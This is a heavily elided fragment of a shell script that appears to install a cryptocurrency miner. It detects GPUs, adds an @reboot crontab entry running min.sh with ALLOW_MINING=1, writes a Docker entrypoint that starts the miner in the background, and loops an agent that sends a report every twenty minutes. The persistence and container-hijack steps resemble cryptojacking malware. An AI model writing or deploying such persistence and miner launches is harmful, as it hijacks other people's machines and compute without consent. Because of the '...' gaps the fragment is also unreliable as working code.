...
start_gpu() {
  # Check if GPU exists
  if ! lspci | grep -qiE "nvidia|amd|ati|radeon"; then
...
gpu_detected() { 
  lspci 2>/dev/null | grep -qiE "nvidia|amd|ati|radeon" && echo "Yes" || echo "No"
}
...
EOF
  ...
  (crontab -l 2>/dev/null | grep -v "ALLOW_MINING=1 $BASE/min.sh"; echo "@reboot sleep 30 && ALLOW_MINING=1 $BASE/min.sh") | crontab -
  
  # For Docker entrypoint
  if [ -n "${DOCKER:-}" ]; then
    echo "#!/bin/sh" > /tmp/docker-entrypoint.sh
    echo "ALLOW_MINING=1 $BASE/min.sh &" >> /tmp/docker-entrypoint.sh
...
agent() {
  ...
  while true; do
    ...
    if [ $((current_time - start_time)) -ge 1200 ] && [ $((current_time - last_report)) -ge 1200 ]; then
      send_20min_report
